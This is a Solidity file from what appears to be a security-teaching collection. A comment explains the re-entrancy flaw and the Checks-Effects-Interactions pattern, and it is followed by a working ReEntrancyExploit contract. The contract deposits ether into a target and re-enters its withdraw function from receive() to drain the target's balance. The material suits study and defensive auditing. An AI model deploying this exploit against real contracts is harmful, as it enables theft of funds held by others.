// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {ReEntrancyInterface} from './Interfaces/ReEntrancyInterface.sol';

/**
 * @title Re-entrancy
 * @author Dom-Mac <dom@dommac.dev>
 *
 * @notice A re-entrancy attack can happen when the
 *         Checks-Effects-Interactions pattern is not
 *         respected during contracts dev.
 *
 *         Check:        Validate parameters before
 *                       modifying the state
 *
 *         Effects:      Change the state
 *
 *         Interactions: Call other contracts after
 *                       storage has been updated
 *
 * @notice Exploit contract
 *
 */

contract ReEntrancyExploit {
  /**
   * @dev Expolit
   */
  ReEntrancyInterface public target;

  /**
   * @dev Initialise targeted contract
   */
  constructor(address target_) {
    target = ReEntrancyInterface(target_);
  }

  /**
   * @dev Function to attack target contract
   */
  function exploit() external payable {
    require(msg.value >= 1 ether);
    target.deposit{value: 1 ether}();
    target.withdraw();
  }

  /**
   * @dev Function executed on plain Ether transfers
   */
  receive() external payable {
    if (address(target).balance >= 1 ether && target.balances(address(this)) > 0) {
      target.withdraw();
    }
  }
}
